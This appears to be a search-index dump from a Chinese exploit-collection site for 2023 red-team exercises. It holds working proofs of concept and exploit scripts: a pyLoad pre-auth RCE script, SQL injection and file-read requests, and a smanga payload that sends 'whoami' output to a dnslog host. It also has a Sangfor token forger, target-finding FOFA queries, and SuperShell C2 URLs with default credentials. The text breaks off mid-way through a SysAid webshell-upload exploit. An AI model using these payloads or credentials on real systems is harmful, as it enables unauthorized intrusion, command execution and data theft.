{\"paht\":\"/etc/passwd\"} ","date":"2023-12-08","objectID":"/panel-loadfile-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"Panel loadfile 后台文件读取漏洞","uri":"/panel-loadfile-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"pyLoad远程代码执行漏洞 pyLoad是一个用 Python 编写的免费和开源下载管理器，可用于NAS、下一代路由器、无头家庭服务器以及任何能够连接到互联网并支持 Python 编程语言的设备。 pyLoad 存在代码注入漏洞，未经身份验证的攻击者可以通过滥用 js2py 功能执行任意 Python 代码。 ","date":"2023-12-08","objectID":"/pyload%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"pyLoad远程代码执行漏洞","uri":"/pyload%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc POST flash/addcrypted2 HTTP/1.1 Host:127.0.0.1 Content-type: application/x-www-form-urlencoded jk=pyimport%20os;os.system(\"id\");f=function%20f2(){};\u0026package=xxx\u0026crypted=AAAA\u0026\u0026passwords=aaaa ","date":"2023-12-08","objectID":"/pyload%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"pyLoad远程代码执行漏洞","uri":"/pyload%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"exp脚本 # Exploit Title: PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE) # Date: 06-10-2023 # Credits: bAu @bauh0lz # Exploit Author: Gabriel Lima (0xGabe) # Vendor Homepage: https://pyload.net/ # Software Link: https://github.com/pyload/pyload # Version: 0.5.0 # Tested on: Ubuntu 20.04.6 # CVE: CVE-2023-0297 import requests, argparse parser = argparse.ArgumentParser() parser.add_argument('-u', action='store', dest='url', required=True, help='Target url.') parser.add_argument('-c', action='store', dest='cmd', required=True, help='Command to execute.') arguments = parser.parse_args() def doRequest(url): try: res = requests.get(url + '/flash/addcrypted2') if res.status_code == 200: return True else: return False except requests.exceptions.RequestException as e: print(\"[!] Maybe the host is offline :\", e) exit() def runExploit(url, cmd): endpoint = url + '/flash/addcrypted2' if \" \" in cmd: validCommand = cmd.replace(\" \", \"%20\") else: validCommand = cmd payload = 'jk=pyimport%20os;os.system(\"'+validCommand+'\");f=function%20f2(){};\u0026package=xxx\u0026crypted=AAAA\u0026\u0026passwords=aaaa' test = requests.post(endpoint, headers={'Content-type': 'application/x-www-form-urlencoded'},data=payload) print('[+] The exploit has be executeded in target machine. ') def main(targetUrl, Command): print('[+] Check if target host is alive: ' + targetUrl) alive = doRequest(targetUrl) if alive == True: print(\"[+] Host up, let's exploit! \") runExploit(targetUrl,Command) else: print('[-] Host down! ') if(arguments.url != None and arguments.cmd != None): targetUrl = arguments.url Command = arguments.cmd main(targetUrl, Command) ","date":"2023-12-08","objectID":"/pyload%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"pyLoad远程代码执行漏洞","uri":"/pyload%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"QQ客户端RCE漏洞 漏洞名称：QQ客户端RCE漏洞 漏洞类型：0day 产品官网链接：https://im.qq.com 影响范围：QQ Windows版9.7.13及以前版本 漏洞所在功能模块：文档传输下载模块 漏洞攻击效果：远程代码执行 ","date":"2023-12-08","objectID":"/qq%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"QQ客户端存在远程命令执行漏洞","uri":"/qq%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"漏洞复现 https://mp.weixin.qq.com/s/u4cmq3SQKzaFXVYj3Er8cg https://mp.weixin.qq.com/s/ZjTPJHxGAz0qYaidbxOYmA ","date":"2023-12-08","objectID":"/qq%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"QQ客户端存在远程命令执行漏洞","uri":"/qq%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"漏洞收集 2023HW漏洞整理，收集整理漏洞EXp/POC,大部分漏洞来源网络，目前收集整理了100多个poc/exp，善用CTRL+F搜索 ","date":"2023-12-08","objectID":"/readme/:0:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.12.07 新增漏洞 WeiPHP\u003e=5.0 SQL注入漏洞 Apache Ofbiz XML-RPC RCE漏洞-CVE-2023-49070 多个防火墙产品RCE ","date":"2023-12-08","objectID":"/readme/:1:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.12.05 新增漏洞 速达软件全系产品存在任意文件上传漏洞 易思智能物流无人值守系统5.0存在任意文件上传漏洞 RuoYi4.6.0 SQL注入漏洞CVE-2023-49371 ","date":"2023-12-08","objectID":"/readme/:2:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.12.03 新增漏洞 智跃人力资源管理系统GenerateEntityFromTable.aspx SQL漏洞 ","date":"2023-12-08","objectID":"/readme/:3:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.11.30 新增漏洞 Apache-ActiveMQ-Jolokia-远程代码执行漏洞-CVE-2022-41678 红帆OA iorepsavexml.aspx 文件上传漏洞 ","date":"2023-12-08","objectID":"/readme/:4:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.11.29 新增漏洞 网神防火墙 app_av_import_save文件上传漏洞 大华智慧园区管理平台任意文件读取 通达OA down.php接口存在未授权访问漏洞 ","date":"2023-12-08","objectID":"/readme/:5:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.11.28 新增漏洞 新开普掌上校园服务管理平台service.action远程命令执行 易宝OA ExecuteSqlForSingle SQL注入漏洞 大华智慧园区综合管理平台 deleteFtp 远程命令执行漏洞 云匣子堡垒机fastjson漏洞 海康威视运行管理中心fastjson漏洞 Array VPN任意文件读取漏洞 万户OA-upload任意文件上传漏洞 ","date":"2023-12-08","objectID":"/readme/:6:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.11.26 新增漏洞 用友NC word.docx任意文件读取漏洞 用友NC的download文件存在任意文件读取漏洞 泛微e-cology9_SQL注入-CNVD-2023-12632 TOTOLINK A3700R命令执行漏洞CVE-2023-46574 Splunk Enterprise 远程代码执行漏洞 (CVE-2023-46214) ","date":"2023-12-08","objectID":"/readme/:7:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.11.24 新增漏洞 华为Auth-Http Serve任意文件读取 昂捷ERP WebService接口 SQL注入漏洞(QVD-2023-45071) 好视通视频会议系统 toDownload.do接口 任意文件读取漏洞 ","date":"2023-12-08","objectID":"/readme/:8:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.11.23 新增漏洞 大华智能物联ICC综合管理平台readpic任意文件读取漏洞 Apache-Submarine-SQL注入漏洞CVE-2023-37924 H3C网络管理系统任意文件读取漏洞 广州图创图书馆集群管理系统存在未授权访问 I Doc View任意文件上传漏洞 致远OA M3 Server 反序列化漏洞 pyLoad远程代码执行漏洞 ","date":"2023-12-08","objectID":"/readme/:9:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.11.20 新增漏洞 金蝶OA-EAS系统 uploadLogo.action 任意文件上传漏洞 浙大恩特客户资源管理系统 文件上传和sql注入漏洞 锐捷RG-UAC统一上网行为管理与审计系统管理员密码泄露 Appium Desktop CVE-2023-2479漏洞 ","date":"2023-12-08","objectID":"/readme/:10:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.11.19 新增漏洞 用友U8-cloud RegisterServlet接口存在SQL注入漏洞 SysAid远程命令执行漏洞（CVE-2023-47246） CVE-2023-4357-Chrome-XXE漏洞 ","date":"2023-12-08","objectID":"/readme/:11:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.11.17 新增漏洞 金蝶OA云星空 ScpSupRegHandler 任意文件上传漏洞 ","date":"2023-12-08","objectID":"/readme/:12:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.11.16 新增漏洞 迪普DPTech VPN 任意文件读取 蓝凌OAsysUiComponent 文件存在任意文件上传漏洞 通达OA get_datas.php前台sql注入 ","date":"2023-12-08","objectID":"/readme/:13:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.11.09 新增漏洞 IP-guard WebServer 远程命令执行漏洞 ","date":"2023-12-08","objectID":"/readme/:14:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.11.08 新增漏洞 奇安信360天擎getsimilarlistSQL注入漏洞 致远M1 usertokenservice 反序列化RCE漏洞 ","date":"2023-12-08","objectID":"/readme/:15:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.11.07 新增漏洞 jshERP信息泄露漏洞 致远OA wpsAssistServlet任意文件读取漏洞 金和OA任意文件读取漏洞 ","date":"2023-12-08","objectID":"/readme/:16:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.11.03 XXL-JOB默认accessToken身份绕过漏洞 Confluence身份认证绕过(CVE-2023-22518) ","date":"2023-12-08","objectID":"/readme/:17:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.10.31 新增漏洞 F5 BIG-IP 远程代码执行漏洞(CVE-2023-46747) Cisco IOS XE CVE-2023-20198权限提升漏洞 ","date":"2023-12-08","objectID":"/readme/:18:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.10.30 新增漏洞 JAVA Public CMS 后台RCE漏洞 ","date":"2023-12-08","objectID":"/readme/:19:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.10.26 新增漏洞 Apache ActiveMQ远程命令执行漏洞 ","date":"2023-12-08","objectID":"/readme/:20:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.10.25 新增漏洞 用友U8-Cloud upload任意文件上传漏洞 安美数字酒店宽带运营系统SQL注入漏洞 泛微E-MobileServer远程命令执行漏洞 蓝凌OA treexml.tmpl 远程命令执行漏洞 ","date":"2023-12-08","objectID":"/readme/:21:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.10.21 新增漏洞 海康威视综合安防管理平台信息泄露 ","date":"2023-12-08","objectID":"/readme/:22:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.10.20 新增漏洞 蓝凌EIS智慧协同平台saveImg接口存在任意文件上传漏洞 用友NC-Cloud uploadChunk 任意文件上传漏洞 深信服下一代防火墙NGAF RCE漏洞 金蝶EAS myUploadFile任意文件上传 用友 GRP U8 license_check.jsp 存在SQL注入 ","date":"2023-12-08","objectID":"/readme/:23:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.10.18 新增漏洞 360天擎 - 未授权与sql注入 深信服SANGFOR终端检测响应平台 - 任意用户免密登录,前台RCE 深信服下一代防火墙NGAF任意文件读取漏洞 Confluence 未授权提权访问漏洞 泛微e-office 未授权访问 金山终端安全系统V9.0 SQL注入漏洞 ","date":"2023-12-08","objectID":"/readme/:24:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.9.26 新增漏洞 JumpServer未授权访问漏洞 CVE-2023-42442 Craft CMS远程代码执行漏洞 CVE-2023-41892 WinRAR CVE-2023-38831 漏洞 用友 GRP-U8 bx_historyDataCheck.jsp SQL注入漏洞 ","date":"2023-12-08","objectID":"/readme/:25:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.9.22 新增漏洞 Joomla 未授权漏洞CVE-2023-23752 ","date":"2023-12-08","objectID":"/readme/:26:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.9.19 新增漏洞 smanga存在未授权远程代码执行漏洞 CVE-2023-36076 JFinalCMS 任意文件读取漏洞(CVE-2023-41599) ","date":"2023-12-08","objectID":"/readme/:27:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"2023.9.14 新增漏洞 致远OA前台用户重置密码漏洞 Apache Spark命令执行漏洞（CVE-2023-32007） ","date":"2023-12-08","objectID":"/readme/:28:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"免责声明 由于传播、利用本文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。所涉及工具来自网络，安全性自测。 ","date":"2023-12-08","objectID":"/readme/:29:0","tags":["2023hw漏洞"],"title":"README","uri":"/readme/"},{"categories":["2023hw漏洞"],"content":"RuoYi4.6.0 SQL注入漏洞CVE-2023-49371 若依在4.6版本之前存在SQL注入漏洞，攻击者通过该漏洞可以进行SQL注入利用，从而获取数据库中的敏感信息 ","date":"2023-12-08","objectID":"/ruoyi4.6.0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2023-49371/:1:0","tags":["2023hw漏洞"],"title":"RuoYi4.6.0 SQL注入漏洞CVE-2023-49371","uri":"/ruoyi4.6.0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2023-49371/"},{"categories":["2023hw漏洞"],"content":"poc DeptName=1\u0026deptid =100\u0026ParentId=12\u0026Status= 0\u0026ordernum =1\u0026ancestors=0)or(extractvalue(1,concat((select user())))); # ","date":"2023-12-08","objectID":"/ruoyi4.6.0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2023-49371/:2:0","tags":["2023hw漏洞"],"title":"RuoYi4.6.0 SQL注入漏洞CVE-2023-49371","uri":"/ruoyi4.6.0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9Ecve-2023-49371/"},{"categories":["2023hw"],"content":"```\rfrom Crypto.Cipher import ARC4 from binascii import a2b_hex def myRC4(data,key): rc41=ARC4.new(key)\rencrypted=rc41.encrypt(data)\rreturn encrypted.encode('hex')\rdef rc4_decrpt_hex(data,key): rc41=ARC4.new(key)\rreturn rc41.decrypt(a2b_hex(data))\rkey=‘20200720’ data=r’,username=TARGET_USERNAME,ip=127.0.0.1,grpid=1,pripsw=suiyi,newpsw=TARGET_PASSWORD,' print(myRC4(data,key)) ","date":"2023-12-08","objectID":"/sangfor_key/:0:0","tags":["2023hw"],"title":"sangfor_key","uri":"/sangfor_key/"},{"categories":["2023hw漏洞"],"content":"smanga存在未授权远程代码执行漏洞 CVE-2023-36076 POST /php/manga/delete.php HTTP/1.1 Host: 127.0.0.1:8181 Content-Length: 360 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://127.0.0.1:8181 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (iPad; CPU OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Referer: http://127.0.0.1:8181/php/manga/delete.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close mangaId=1+union+select+*+from+%28select+1%29a+join+%28select+2%29b+join+%28select+3%29c+join+%28select+4%29d+join+%28select+%27%5C%22%3Bping+-c+3+%60whoami%60.uoi9vt.dnslog.cn%3B%5C%22%27%29e+join+%28select+6%29f+join+%28select+7%29g+join+%28select+8%29h+join+%28select+9%29i+join+%28select+10%29j+join+%28select+11%29k+join+%28select+12%29l%3B\u0026deleteFile=true ","date":"2023-12-08","objectID":"/smanga%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"smanga存在未授权远程代码执行漏洞","uri":"/smanga%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"漏洞复现 https://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==\u0026mid=2247499614\u0026idx=1\u0026sn=96043db01ebaf64197a14fbb095a89cd\u0026chksm=ea340004dd438912d010a45c78284e9b877fa00a08ad3834f38c0f7e5bf97ba577ca72f01321\u0026scene=0\u0026xtrack=1#rd ","date":"2023-12-08","objectID":"/smanga%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"smanga存在未授权远程代码执行漏洞","uri":"/smanga%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"Smart S85F 任意文件读取 GET /log/decodmail.php?file=L2V0Yy9gc2xlZXAke0lGU30xMGAucGNhcA== HTTP/1.1 Host: x.x.x.x Cookie: PHPSESSID=c36d5527fd784aa29748b3b1c50be7bc User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/114.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Te: trailers Connection: close ","date":"2023-12-08","objectID":"/smart-s85f-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/:1:0","tags":["2023hw漏洞"],"title":"Smart S85F 任意文件读取","uri":"/smart-s85f-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')\" ","date":"2023-12-08","objectID":"/smartbi-smartbivisionrmiservlet-%E6%8E%A5%E5%8F%A3%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"Smartbi smartbivisionRMIServlet 接口权限绕过漏洞","uri":"/smartbi-smartbivisionrmiservlet-%E6%8E%A5%E5%8F%A3%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc POST /smartbi/vision/RMIServlet HTTP/1.1 Host: bi.diousgroup.com.cn User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 67 className=UserService\u0026methodName=loginFromDB¶ms=[\"public\",\"0a\"] POST /smartbi/vision/RMIServlet HTTP/1.1 Host: bi.diousgroup.com.cn User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 68 className=UserService\u0026methodName=loginFromDB¶ms=[\"service\",\"0a\"] HTTP/1.1 200 Server: nginx Date: Mon, 14 Aug 2023 07:18:54 GMT Content-Type: text/html;charset=UTF-8 Connection: keep-alive Set-Cookie: JSESSIONID=BAB0A878DD91CB2DD9F669F21B28157D; Path=/smartbi; HttpOnly Content-Length: 40 {\"retCode\":0,\"result\":true,\"duration\":3} ","date":"2023-12-08","objectID":"/smartbi-smartbivisionrmiservlet-%E6%8E%A5%E5%8F%A3%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"Smartbi smartbivisionRMIServlet 接口权限绕过漏洞","uri":"/smartbi-smartbivisionrmiservlet-%E6%8E%A5%E5%8F%A3%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"Splunk Enterprise 远程代码执行漏洞 (CVE-2023-46214) Splunk 是一款机器数据的引擎，可用于收集、索引和利用所有应用程序、服务器和设备生成的快速移动型计算机数据 。 在 Splunk Enterprise 9.0.7 和 9.1.2 以下版本中，Splunk Enterprise 无法安全地对用户提供的可扩展样式表语言转换 (XSLT) 进行过滤，攻击者可以上传恶意 XSLT，从而在 Splunk Enterprise 实例上远程执行代码。 ","date":"2023-12-08","objectID":"/splunk-enterprise-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-46214/:1:0","tags":["2023hw漏洞"],"title":"Splunk Enterprise 远程代码执行漏洞 (CVE-2023-46214)","uri":"/splunk-enterprise-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-46214/"},{"categories":["2023hw漏洞"],"content":"exp https://github.com/nathan31337/Splunk-RCE-poc ","date":"2023-12-08","objectID":"/splunk-enterprise-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-46214/:2:0","tags":["2023hw漏洞"],"title":"Splunk Enterprise 远程代码执行漏洞 (CVE-2023-46214)","uri":"/splunk-enterprise-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-46214/"},{"categories":["2023hw漏洞"],"content":"漏洞分析 https://blog.hrncirik.net/cve-2023-46214-analysis ","date":"2023-12-08","objectID":"/splunk-enterprise-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-46214/:3:0","tags":["2023hw漏洞"],"title":"Splunk Enterprise 远程代码执行漏洞 (CVE-2023-46214)","uri":"/splunk-enterprise-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2023-46214/"},{"categories":["2023hw"],"content":"## fofa\rtitle=\"Supershell\" || header=\"supershell\" || banner=\"supershell\" ","date":"2023-12-08","objectID":"/supershell-%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"SuperShell 漏洞","uri":"/supershell-%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞c2 http://tdragon6:tdragon6@1.116.40.36:8888 http://tdragon6:tdragon6@107.174.95.93:8888 http://tdragon6:tdragon6@118.89.125.171:8888 http://tdragon6:tdragon6@139.159.236.228:8888 http://tdragon6:tdragon6@150.158.100.126:8888 http://tdragon6:tdragon6@192.210.162.147:8888 http://tdragon6:tdragon6@43.128.88.112:8888 http://tdragon6:tdragon6@43.138.243.184:8888 http://tdragon6:tdragon6@43.153.184.122:8888 ","date":"2023-12-08","objectID":"/supershell-%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"SuperShell 漏洞","uri":"/supershell-%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"SysAid远程命令执行漏洞（CVE-2023-47246） ","date":"2023-12-08","objectID":"/sysaid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-47246/:1:0","tags":["2023hw漏洞"],"title":"SysAid远程命令执行漏洞（CVE-2023-47246）","uri":"/sysaid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-47246/"},{"categories":["2023hw漏洞"],"content":"漏洞影响版本 SysAid Server\u003c23.3.36 ","date":"2023-12-08","objectID":"/sysaid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-47246/:2:0","tags":["2023hw漏洞"],"title":"SysAid远程命令执行漏洞（CVE-2023-47246）","uri":"/sysaid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-47246/"},{"categories":["2023hw漏洞"],"content":"网络空间搜索 fofa：body=\"sysaid-logo-dark-green.png\" || title=\"SysAid Help Desk Software\" || body=\"Help Desk software \u003ca href=\\\"http://www.sysaid.com\\\"\u003eby SysAid\u003c/a\u003e\" shodan：http.favicon.hash:1540720428 zoomeye：app:\"SysAid On-Prem Software\" hunter.how：favicon_hash=\"5f30870725d650d7377a134c74f41cfd\" ","date":"2023-12-08","objectID":"/sysaid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-47246/:3:0","tags":["2023hw漏洞"],"title":"SysAid远程命令执行漏洞（CVE-2023-47246）","uri":"/sysaid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2023-47246/"},{"categories":["2023hw漏洞"],"content":"Exp脚本 import argparse import binascii import random import time import zipfile import zlib import urllib3 import requests urllib3.disable_warnings() def compressFile(shellFile, warFile): try: with zipfile.ZipFile(warFile, 'w', zipfile.ZIP_DEFLATED) as zipf: zipf.write(shellFile) zipf.close() return True except: return False def getHexData(warFile): with open(warFile, 'rb') as warfile: data = warfile.read() warfile.close() compressed_data = zlib.compress(data) hex_data = binascii.hexlify(compressed_data).decode() return hex_data def generateRandomDirectoryName(num): charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' return ''.join(random.choice(charset) for _ in range(num)) def get_random_agent(): agent_list = [ 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7', 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0', 'Mozilla/5.0 